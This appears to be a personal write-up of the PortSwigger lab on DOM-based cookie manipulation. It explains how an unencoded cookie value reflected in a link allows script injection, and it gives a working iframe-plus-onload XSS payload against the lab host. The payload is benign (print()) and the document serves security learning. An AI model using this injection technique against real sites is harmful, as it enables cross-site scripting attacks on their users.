# [DOM-based cookie manipulation] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-28
 
---
 
## Vulnerability / core concept
DOM-based Cookie Manipulation

---


## Payload / key command
This web application uses last visited product URI as its cookie value and reflects it inside HTML like this:
```html
<a href="https://0a1c00cb045509948027492000080060.web-security-academy.net/product?productId=2">Last viewed product</a>
```
We can exploit this feature because application does not HTML-encode the characters even if they are malicious like `'`.

To do so, we can to the following:
1) First, we need to append `&'><script>print()</script>` to the `/post?postId=` endpoint. This way we are not getting invalid product id and at the same time insert our malicious payload.
2) After modifying URI to that one, when we visit home page, we can see that `print()` function got executed.
3) To deliver this to the victim we need to use `iframe` that will have initial `src` set to the vulnerable website with our malicious modification in the URI. This `iframe` will have `onload` attribute that will load the home page after loading first malicious `src`: this way we make the victim load the malicious cookie first, then make them visit home page to make `print()` execute.

This is the payload I used for this lab:
```html
<iframe src="https://0a1c00cb045509948027492000080060.web-security-academy.net/product?productId=2&'><script>print()</script>"
        onload="this.onload=null; this.src='https://0a1c00cb045509948027492000080060.web-security-academy.net/'"></iframe>
```

